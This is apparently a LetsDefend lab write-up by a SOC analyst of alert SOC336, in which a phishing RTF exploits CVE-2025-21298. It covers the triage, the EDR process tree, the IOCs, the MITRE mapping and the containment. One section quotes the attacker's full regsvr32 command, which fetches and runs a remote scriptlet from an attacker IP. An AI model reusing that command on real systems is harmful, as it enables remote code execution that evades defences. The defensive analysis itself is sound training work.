# SOC336 — Windows OLE Zero-Click RCE Exploitation (CVE-2025-21298)

**Platform:** LetsDefend  
**Alert ID:** SOC336  
**Severity:** High  
**Classification:** True Positive — Confirmed Malicious Activity  
**Analyst:** [John Mark]  
**Date:** [3/25/2026]

---

## Summary

A phishing email containing a malicious RTF attachment (`mail.rtf`) was delivered to user `Austin@letsdefend.io` (host: `172.16.17.137`). The attachment exploited **CVE-2025-21298**, a Windows OLE vulnerability allowing zero-click remote code execution. Upon opening, the attack triggered an unusual process chain from Outlook, abusing legitimate Windows binaries (`cmd.exe`, `regsvr32.exe`) to retrieve and execute a remote script (`shell.sct`) from an attacker-controlled server — a classic **Living-Off-The-Land (LOLBin)** technique designed to evade detection. The host was confirmed compromised and immediately isolated via EDR.

---

## Alert Details

| Field | Value |
|---|---|
| Recipient | Austin@letsdefend.io |
| Recipient Host | Austin |
| Recipient Host IP | 172.16.17.137 |
| Sender | projectmanagement@pm.me |
| Attachment | mail.rtf |
| File Hash (SHA256) | `df993d037cdb77a435d6993a37e7750dbbb16b2df64916499845b56aa9194184` |
| Email Delivery Time | 05:12 AM |
| Alert Trigger Time | 04:18 PM |
| Device Action | Allowed |
| CVE | CVE-2025-21298 |

> **Note:** The ~11-hour gap between email delivery and alert trigger indicates the user likely opened the attachment later in the day, at which point the malicious activity was initiated.

---

## Indicators of Compromise (IOCs)

| Type | Value | Verdict |
|---|---|---|
| Sender email | projectmanagement@pm.me | Suspicious |
| Attachment | mail.rtf | Malicious |
| File hash (SHA256) | `df993d037cdb77a435d6993a37e7750dbbb16b2df64916499845b56aa9194184` | Malicious |
| C2 / Payload server IP | 84.38.130.118 | Malicious |
| Malicious script URL | `hxxp[://]84[.]38[.]130[.]118[.]com/shell.sct` | Malicious |
| Remote script | shell.sct | Malicious |
| CVE | CVE-2025-21298 | Windows OLE RCE |

---

## Threat Intelligence Results

| Platform | Verdict |
|---|---|
| VirusTotal | 22/59 engines flagged as malicious |
| Hybrid Analysis | 100/100 malicious score |
| IBM X-Force | High Risk — exploit family linked to CVE-2025-21298 |
| Cisco Talos | Malicious |
| LetsDefend TI | Confirmed match to known exploit |

All five threat intelligence sources independently confirmed the file as malicious, providing high-confidence verdict with no ambiguity.

---

## Investigation Walkthrough

### 1. Initial Alert Review

I began by taking ownership of the alert and reviewing all available metadata: users involved, IP addresses, hostname (`Austin`), attachment filename (`mail.rtf`), file hash, timestamps, and the requested URL. The presence of an RTF attachment from an external sender immediately raised suspicion.

I noted a significant time gap — the email was delivered at **05:12 AM** but the alert triggered at **04:18 PM**. This indicated the user opened the attachment approximately 11 hours after delivery, which initiated the malicious activity.

### 2. Scope Assessment

I checked email security logs to determine whether other users received the same email. No strong evidence of multiple recipients was found, suggesting this was a **targeted attack** rather than a broad phishing campaign.

### 3. EDR — Process Tree Analysis

EDR analysis of host `Austin` immediately revealed a highly suspicious process execution chain:

```
OUTLOOK.exe
    └── Explorer.exe
            └── cmd.exe
                    └── regsvr32.exe
```

This chain is a major red flag. Outlook spawning `cmd.exe`, followed by `regsvr32.exe`, is not expected behavior in normal user activity. These are well-known **Living-Off-The-Land Binaries (LOLBins)** — legitimate Windows tools abused by attackers to execute malicious code while evading security controls.

### 4. Command-Line Analysis

Inspection of the command-line activity revealed the exact malicious command executed:

```
C:\Windows\System32\cmd.exe /c regsvr32.exe /s /u /i:http://84.38.130.118.com/shell.sct scrobj.dll
```

Breaking this down:
- `regsvr32.exe /s /u /i` — silently registers a COM scriptlet from a remote URL
- `shell.sct` — a remote scriptlet file fetched from the attacker's server
- `scrobj.dll` — Windows Script Component handler used to execute the scriptlet

This is a well-documented **regsvr32 AppLocker bypass / fileless execution technique**, where malicious code runs entirely in memory without dropping a traditional executable — making it harder to detect with standard AV tools.

### 5. Network Analysis

Network log review confirmed a successful outbound connection to:

```
hxxp[://]84[.]38[.]130[.]118[.]com/shell.sct
```

The connection was **not quarantined** by security controls, because `regsvr32.exe` is a trusted, signed Windows binary. This is precisely why LOLBin techniques are effective against signature-based defenses.

### 6. File Analysis

Static analysis of `mail.rtf` across multiple threat intelligence platforms confirmed:

- The file is a malicious RTF document exploiting **CVE-2025-21298**
- CVE-2025-21298 is a Windows OLE vulnerability allowing **zero-click RCE** — meaning simply opening or previewing the RTF file is sufficient to trigger the exploit, with no further user interaction required
- Hybrid Analysis returned a perfect **100/100 malicious score**
- VirusTotal returned **22/59** engine detections

### 7. Containment

I immediately **isolated host `Austin` via EDR** to:
- Cut off active C2 communication with `84.38.130.118`
- Prevent lateral movement within the network
- Preserve endpoint forensic evidence

### 8. Artifact Documentation

All relevant artifacts were logged for detection and future threat intelligence reference:
- Malicious IP: `84.38.130.118`
- File hash: `df993d037cdb77a435d6993a37e7750dbbb16b2df64916499845b56aa9194184`
- Malicious URL: `hxxp[://]84[.]38[.]130[.]118[.]com/shell.sct`
- Sender email: `projectmanagement@pm.me`

---

## Attack Flow

```
Phishing email delivered (projectmanagement@pm.me)
        ↓
User opens mail.rtf ~11 hours after delivery
        ↓
CVE-2025-21298 triggered — Windows OLE zero-click RCE exploit
        ↓
OUTLOOK.exe → Explorer.exe → cmd.exe spawned
        ↓
regsvr32.exe executes remote scriptlet:
hxxp://84.38.130.118/shell.sct (fileless execution)
        ↓
Successful outbound connection to attacker C2 confirmed in logs
        ↓
Host isolated via EDR
```

---

## MITRE ATT&CK Mapping

| Technique ID | Technique Name | Description |
|---|---|---|
| T1566.001 | Phishing: Spearphishing Attachment | Malicious RTF delivered via targeted email |
| T1203 | Exploitation for Client Execution | CVE-2025-21298 Windows OLE RCE exploit |
| T1218.010 | System Binary Proxy Execution: Regsvr32 | LOLBin abuse to execute remote scriptlet |
| T1059.005 | Command and Scripting Interpreter: Visual Basic | shell.sct scriptlet execution |
| T1071.001 | Application Layer Protocol: Web Protocols | C2 communication over HTTP |
| T1027 | Obfuscated Files or Information | Fileless execution — payload runs in memory |

---

## Verdict

**True Positive — Confirmed Malicious Activity**

The phishing email successfully delivered a malicious RTF exploit (CVE-2025-21298), which triggered a LOLBin-based execution chain via `regsvr32.exe`. The host successfully reached the attacker's C2 server and retrieved a remote script. The attack used fileless techniques to evade detection, and the host was confirmed compromised.

---

## Recommendations

- [ ] Block C2 IP `84.38.130.118` at network perimeter and firewall
- [ ] Block sender email `projectmanagement@pm.me` in email gateway
- [ ] Quarantine and remove `mail.rtf` from all mailboxes
- [ ] Reset credentials for affected user `Austin@letsdefend.io`
- [ ] Apply Microsoft security patch for CVE-2025-21298 across all endpoints
- [ ] Review email logs for similar RTF attachments from external senders
- [ ] Implement detection rules for `regsvr32.exe` spawning from `OUTLOOK.exe`
- [ ] Enable Script Block Logging and AMSI to detect fileless scriptlet execution
- [ ] Conduct user awareness training on RTF and Office document-based attacks

---

## Tools Used

| Tool | Purpose |
|---|---|
| VirusTotal | File hash and IP reputation |
| Hybrid Analysis | Static and dynamic malware analysis |
| IBM X-Force | Exploit family classification |
| Cisco Talos | Threat intelligence verification |
| LetsDefend EDR | Process tree, command-line, and containment |
| LetsDefend SIEM | Network log and connection analysis |
| LetsDefend Email Security | Email delivery timeline and attachment review |

---

## Key Learnings

- **LOLBin abuse is subtle but detectable.** `regsvr32.exe` and `cmd.exe` are legitimate Windows tools, but when spawned as children of `OUTLOOK.exe`, they become strong indicators of compromise. Context matters more than the process name alone.
- **Multi-source threat intelligence accelerates triage.** No single platform confirmed the full picture — combining VirusTotal, Hybrid Analysis, IBM X-Force, and Cisco Talos provided high-confidence results quickly and reduced ambiguity.
- **Fileless techniques bypass traditional AV.** Because the malicious payload (`shell.sct`) executed entirely in memory via `regsvr32.exe`, there was no file dropped to disk for AV to detect. This highlights the importance of behavioral detection and EDR telemetry over signature-based tools alone.
- **Delivery time vs. alert trigger time matters.** The ~11-hour gap between email delivery and alert trigger was a key detail — it confirmed the user manually opened the attachment, which is important for understanding the attack timeline and scope.
- **Zero-click RCE vulnerabilities are especially dangerous.** CVE-2025-21298 required no macro enablement or additional user interaction beyond opening the RTF — making it more dangerous than standard malicious document attacks.
